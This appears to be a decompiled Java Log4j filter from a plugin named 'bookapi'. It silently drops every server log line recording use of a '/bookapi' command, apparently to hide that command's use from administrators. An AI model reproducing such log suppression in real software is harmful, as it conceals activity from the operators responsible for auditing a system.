package by.dero.gvh.bookapi;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.Marker;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.Logger;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.apache.logging.log4j.message.Message;

public class Log4JFilter extends AbstractFilter {
   public Result filter(LogEvent record) {
      try {
         if(record != null && record.getMessage() != null) {
            String npe = record.getMessage().getFormattedMessage().toLowerCase();
            return !npe.contains("issued server command:")?Result.NEUTRAL:(!npe.contains("/bookapi")?Result.NEUTRAL:Result.DENY);
         } else {
            return Result.NEUTRAL;
         }
      } catch (NullPointerException var3) {
         return Result.NEUTRAL;
      }
   }

   public Result filter(Logger arg0, Level arg1, Marker arg2, String message, Object... arg4) {
      try {
         if(message == null) {
            return Result.NEUTRAL;
         } else {
            String npe = message.toLowerCase();
            return !npe.contains("issued server command:")?Result.NEUTRAL:(!npe.contains("/bookapi")?Result.NEUTRAL:Result.DENY);
         }
      } catch (NullPointerException var7) {
         return Result.NEUTRAL;
      }
   }

   public Result filter(Logger arg0, Level arg1, Marker arg2, Object message, Throwable arg4) {
      try {
         if(message == null) {
            return Result.NEUTRAL;
         } else {
            String npe = message.toString().toLowerCase();
            return !npe.contains("issued server command:")?Result.NEUTRAL:(!npe.contains("/bookapi")?Result.NEUTRAL:Result.DENY);
         }
      } catch (NullPointerException var7) {
         return Result.NEUTRAL;
      }
   }

   public Result filter(Logger arg0, Level arg1, Marker arg2, Message message, Throwable arg4) {
      try {
         if(message == null) {
            return Result.NEUTRAL;
         } else {
            String npe = message.getFormattedMessage().toLowerCase();
            return !npe.contains("issued server command:")?Result.NEUTRAL:(!npe.contains("/bookapi")?Result.NEUTRAL:Result.DENY);
         }
      } catch (NullPointerException var7) {
         return Result.NEUTRAL;
      }
   }
}